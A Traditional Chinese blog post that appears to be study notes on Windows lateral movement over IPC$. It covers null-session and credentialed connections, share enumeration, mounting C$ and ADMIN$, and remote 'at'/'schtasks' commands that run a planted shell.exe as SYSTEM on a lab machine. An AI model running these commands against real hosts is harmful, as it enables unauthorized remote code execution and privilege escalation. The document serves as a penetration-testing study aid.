---
layout: post
title: "window IPC$(空連接)"
description: ""
date: 2023-07-11
categories:
  - Windows後滲透
  - CMD常用指令
author: ""
tags: ['Windows後滲透', 'CMD']
---



# window IPC$(空連接)
###### tags: `Windows 域滲透`

## 注意: UAC 可能影響非常多指令， net use 兩台互連很容易出現系統發生 5錯誤 存取被拒!!!

### 如果不想被UAC干擾 
1.你只能使用 amdinistrator 帳號，其他帳號都是無法的(即使amdinistrators組也不行)
2.關閉UAC


原本在書上看過這種攻擊，沒想到已經是年代久遠的方式了，聽說發生在 win NT/2000/XP/win 7 環境下，但我實測win7也不行，應該是打了補丁。


所以就當作學習資料文件公享類的域滲透吧。





### 空連接(可以但沒用了權限超低)
```
net use \\192.168.43.217\IPC$ "" /user:""
```





### 預設 admintitrators 密碼為空 (但空密碼不准連接)
```
net use \\192.168.43.217\IPC$ "" /user:"administrators"
```



### 假設我們已知管理員帳號
```
net use \\192.168.43.217\IPC$ "xxxx" /user:"liar"
```

### 看已互連過的電腦
```
net view
```

### 查看對方的共享資源
```
net view \\192.168.43.217
```


### 得到远程主机的 NetBIOS 用户名列表
```
nbtstat -A 192.168.43.217
```



### 看到對方開啟了共享資源
```
Users
shares5
```

### 掛載目標預設開啟的資料夾到攻擊者的盤
```
net use z: \\192.168.43.217\IPC$
net use x: \\192.168.43.217\C$
net use w: \\192.168.43.217\ADMIN$
net use v: \\192.168.43.217\print$
(預設)

### at排程
```
查看對方時間
Net time \\192.168.43.217

at \\192.168.43.217 10:42 C:\Windows\shell.exe 
這招沒用(原因不確定而且這招在高版本被棄掉了，但我在有些環境又可以) 
```


### schtasks 排程(這招測試需要關閉防火牆)
```
設定排程
schtasks /create /s 192.168.43.217 /u liar /p xxxx /ru "SYSTEM" /tn hack /sc DAILY  /tr C:\Windows\shell.exe /F


強制執行排程
schtasks /run /s 192.168.43.217 /u liar /p xxxx /tn hack /i

```

### 返回的meterpreter 叫出 window shell 是
```
nt authority\system
```

### 刪除連接
```
net use * /del
```


<br/>
<br/>

## 參考資料:
https://blog.csdn.net/qq_45521281/article/details/105820827#:~:text=%E7%A9%BA%E8%BF%9E%E6%8E%A5%E5%B0%B1%E6%98%AF%E4%B8%8D%E7%94%A8%E5%AF%86%E7%A0%81,%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86%E3%80%82


https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/



https://micro8.gitbook.io/micro8/contents-1/31-40/38certutil-yi-ju-hua-xia-zai-payload


https://www.wangan.com/p/7fygfgedde5e5d30


http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS


https://xz.aliyun.com/t/2319


http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS


https://m.freebuf.com/articles/system/331639.html#:~:text=Impacket%E6%98%AF%E7%94%A8%E4%BA%8E%E5%A4%84%E7%90%86,%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E5%8F%98%E5%BE%97%E7%AE%80%E5%8D%95%E3%80%82


https://micro8.gitbook.io/micro8/contents-1/31-40/38certutil-yi-ju-hua-xia-zai-payload